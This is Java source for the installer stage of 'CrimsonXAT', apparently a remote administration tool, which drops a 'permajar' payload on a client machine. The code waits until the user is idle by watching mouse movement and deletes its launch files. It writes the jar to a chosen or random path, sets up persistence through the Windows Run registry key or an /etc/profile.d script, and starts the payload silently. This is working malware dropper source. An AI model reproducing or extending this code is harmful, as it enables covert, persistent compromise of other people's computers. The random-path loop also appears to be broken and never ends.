/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.bootstrapper;

import java.awt.MouseInfo;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Date;
import java.util.Random;
import java.util.Scanner;

import subterranean.crimson.permajar.stage1.Stage1;
import subterranean.crimson.universal.FileLocking;
import subterranean.crimson.universal.GenerationUtils;
import subterranean.crimson.universal.Path;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.Version;
import subterranean.crimson.universal.classreference.ClassReference;
import subterranean.crimson.universal.containers.InstallationDetails;
import subterranean.crimson.universal.containers.Options;
import subterranean.crimson.universal.containers.SystemMessage;
import subterranean.crimson.universal.objects.InvalidObjectException;
import subterranean.crimson.universal.objects.ObjectTransfer;



/**
 * 
 * The purpose of this class is to install the Crimson permajar onto the client
 *
 */
public class Client {

	private static Path Ipath;
	private static Options options;
	private static ArrayList<File> cleanup = new ArrayList<File>();

	public static void main(String[] args) {

		// check for lock files
		System.out.println(("boot-lock_file"));
		if (FileLocking.lockExists()) {
			// get out of here
			System.out.println(("boot_error-lock_file"));
			return;
		}

		for (int i = 0; i < args.length; i++) {
			// delete any files that may be passed as arguments
			Utilities.delete(new File(args[i]));
		}

		loadOptions();
		options.details = new InstallationDetails();

		if (options.waitForIDLE) {
			// wait for idle
			System.out.println(("boot-idle_wait"));
			idle();

		} else {
			// use delay
			try {
				long delay = options.executionDelay;
				System.out.println(("boot-delay"));

				Thread.sleep(delay);
			} catch (NumberFormatException e) {

			} catch (InterruptedException e) {
				// interrupted during the delay, quit
				System.out.println(("Error: Installation delay was interrupted"));
				return;
			}

		}

		System.out.println(("boot-installing"));

		// document the installation time
		options.details.installDate = new Date();

		// load path based on platform
		if (Platform.windows) {
			Ipath = options.windows;
		} else if (Platform.linux) {
			Ipath = options.linux;
		} else {
			Ipath = options.osx;
		}

		// replace all %USERNAME% with the actual username
		Ipath.replace("%USERNAME%", System.getProperty("user.name"));

		// make sure the directory exists
		File test = new File(Ipath.getParentPath());
		if (!test.exists()) {
			test.mkdirs();
		}

		// create a temp file to write classes
		File root = new File(Platform.tempDir + "cr_" + new Date().getTime());
		cleanup.add(root);
		if (!tryWrite_classes(root)) {
			// failed
			System.out.println(("Error: temporary directory is not writable"));
			return;
		}
		// all classes have been written to the temp dir and are ready to be copied to the
		// target

		File target = new File(Ipath.getAbsolutePath());
		if (target.exists()) {
			// we have a collision
			if (options.handleErrors) {
				// This thing is going down no matter what
				findWrite_jar();
			} else {
				// dont try again
				cleanUp(root);
				return;
			}
		} else {
			// target does not exist. Try write
			if (tryWrite_jar(target, root)) {
				// write succeeded
			} else {
				// write failed
				if (options.handleErrors) {
					// This thing is going down no matter what
					findWrite_jar();

				} else {
					// dont try again
					cleanUp(root);
					return;

				}
			}

		}
		cleanUp(root);

		// get bootstrap jar path
		File path = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());

		// autostart

		if (Platform.windows) {
			switch (options.win_autostart_method) {
			case None: {

				break;
			}
			case Registry: {
				String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"" + Ipath.getName() + "\" /d \"\"" + Ipath.getAbsolutePath() + "\"\" /t REG_SZ";
				try {

					if (Runtime.getRuntime().exec(command).waitFor() != 0) {
						// error
						throw new IOException();
					}
				} catch (IOException | InterruptedException e) {
					e.printStackTrace();
					System.out.println(("Error: couldnt create registry key"));
					SystemMessage sm = new SystemMessage();
					sm.date = new Date();
					sm.source = ("Registry autostart module");
					sm.message = ("The autostart module failed to write a registry key.");
					sm.subject = ("Failed to create startup key");
					sm.urgency = 1;
					options.details.sms.add(sm);
				}
				break;
			}
			}

		} else {
			// TODO
			File startScript = new File("/etc/profile.d/" + Utilities.nameGen(5) + ".sh");
			try {
				PrintWriter pw = new PrintWriter(startScript);
				pw.println("java -jar " + Ipath.getAbsolutePath() + "  </dev/null &>/dev/null &");
				pw.println("disown");

				pw.close();

			} catch (FileNotFoundException e) {

			}

		}

		// Start Jar
		try {

			if (Version.release) {
				if (Platform.osx) {
					Runtime.getRuntime().exec("nohup java -Dapple.awt.UIElement=\"true\" -jar " + Ipath.getAbsolutePath() + " " + path.toString());
				} else if (Platform.windows) {
					Runtime.getRuntime().exec("javaw -jar " + Ipath.getAbsolutePath() + " " + path.toString());

				} else {
					Runtime.getRuntime().exec("nohup java -jar " + Ipath.getAbsolutePath() + " " + path.toString());
				}

			} else {

				// dont start the jar
				return;
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println(("misc-init_complete"));
		//

	}

	// block until system is idle
	private static void idle() {
		long begin = new Date().getTime();
		int segments = 0;
		while (!Thread.interrupted()) {
			int x = MouseInfo.getPointerInfo().getLocation().x;
			int y = MouseInfo.getPointerInfo().getLocation().y;
			try {
				Thread.sleep(60000);
			} catch (InterruptedException e) {
				// probably exited
				System.exit(0);

			}
			int x2 = MouseInfo.getPointerInfo().getLocation().x;
			int y2 = MouseInfo.getPointerInfo().getLocation().y;

			if ((x == x2) && (y == y2)) {
				// pointer has likely not moved since last poll
				segments++;// another segment has been completed

				if (segments > 10) {// ten consecutive segments went without interaction
					// system is idle, return
					options.details.waitedIDLEfor = (int) ((new Date().getTime() - begin) / 1000);
					return;

				}
			} else {

				segments = 0;// start over

			}

		}
	}

	public static void cleanUp(File root) {
		Utilities.delete(root);
	}

	public static boolean tryWrite_jar(File path, File root) {
		// now create jar from temp files
		try {
			String[] targets = { "io", "subterranean" };
			if (!GenerationUtils.create(path.getAbsolutePath(), targets, "subterranean.crimson.permajar.stage1.PermaJar", root)) {
				throw new Exception();
			}

		} catch (Exception e) {
			cleanUp(path);
			return false;
		}

		return path.exists();
	}

	public static boolean tryWrite_classes(File root) {

		if (!root.mkdir()) {
			// failed
			return false;
		}

		GenerationUtils.writeClasses(subterranean.crimson.universal.classreference.Stage1.resources, root, null);

		// copy options
		File opt = new File(root.getAbsoluteFile() + Platform.fileSeparator + "subterranean/crimson/options");
		try {
			PrintWriter pw = new PrintWriter(opt);
			pw.println(ObjectTransfer.toString(options, false));

			pw.close();
		} catch (FileNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			return false;
		}

		return true;

	}

	public static void findWrite_jar() {
		// find a place to write no matter what
		File root = null;
		if (Platform.windows) {
			root = new File("C:/");
		} else {
			root = new File("/");
		}
		File target = new File(Ipath.getName());
		if (target.exists()) {
			target = new File(Utilities.nameGen(6) + ".jar");
		}
		while (!tryWrite_jar(target, root)) {
			System.out.println("Write failed for: " + target.getAbsolutePath());
			// get a random path
			File path = new File(root.getAbsolutePath());
			String[] list = root.list();
			// go all the way down in the path
			while (list.length > 0) {
				int index = new Random().nextInt(list.length);
				path = new File(path.getAbsoluteFile() + list[index]);// add a random dir
																		// to the path
			}
			target = new File(path.getAbsoluteFile() + Utilities.nameGen(6) + ".jar");

		}

		System.out.println("Wrote successfully to a random file. Updating options file");

		options.details.details.put("modified_payload_name", target.getName());
		options.details.details.put("modified_install_path", target.getParentFile().getAbsolutePath());

	}

	public static void loadOptions() {

		InputStream in = Stage1.class.getResourceAsStream("/subterranean/crimson/options");
		if (in == null) {
			// the options file was not found
			System.out.println("FATAL: Could not find options");
			return;
		}
		Scanner s = new Scanner(in);
		if (!s.hasNextLine()) {
			// empty options file
			// error
		} else {
			try {
				options = (Options) ObjectTransfer.fromString(s.nextLine(), true);

			} catch (InvalidObjectException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
		s.close();
	}

}
